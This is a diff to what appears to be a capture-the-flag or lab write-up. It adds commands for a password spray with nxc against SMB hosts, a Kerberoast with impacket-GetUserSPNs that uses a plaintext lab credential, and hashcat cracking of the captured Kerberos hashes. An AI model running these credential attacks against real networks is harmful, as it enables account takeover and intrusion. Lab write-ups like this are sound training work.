@@ -70,16 +70,22 @@ Finally, after i got the file i got my credentials.
 
 With these credentials i was able to set up a password spray attack to see what accounts worked.
 
+    nxc smb 10.109.124.214 10.109.124.241 10.109.124.232 -u users.txt -p passwords.txt
+ 
 <img width="586" height="423" alt="image" src="https://github.com/user-attachments/assets/66e7f2a0-e7fb-49ad-9e61-f109146c1a8a" />
 
 
 After i found a valid login i used it to perform a kereroast attack on the domain controller (Since kereberos was open). 
 
+    impacket-GetUserSPNs -request -dc-ip 10.109.124.214 kingofthehill.local/ghostadmin:Resurrect1 > output.txt
+
 <img width="1318" height="88" alt="image" src="https://github.com/user-attachments/assets/90c24179-b6ba-4ad0-9ea3-e925cc3e6a4f" />
 
+Now that i got the kereberos hashes it was time to crack them with hashcat.
 
-<img width="947" height="323" alt="image" src="https://github.com/user-attachments/assets/4d9002e7-195e-47ea-b6d2-cc884030c80a" />
-
+    hashcat -a 0 output.txt /usr/share/wordlists/rockyou.txt.gz
+    
+<img width="702" height="89" alt="image" src="https://github.com/user-attachments/assets/ab31f31a-e87d-42b7-b568-83aced193cec" />
 
 <img width="682" height="103" alt="image" src="https://github.com/user-attachments/assets/b9dbda38-b941-48a3-8307-b5f56aa8e237" />
 
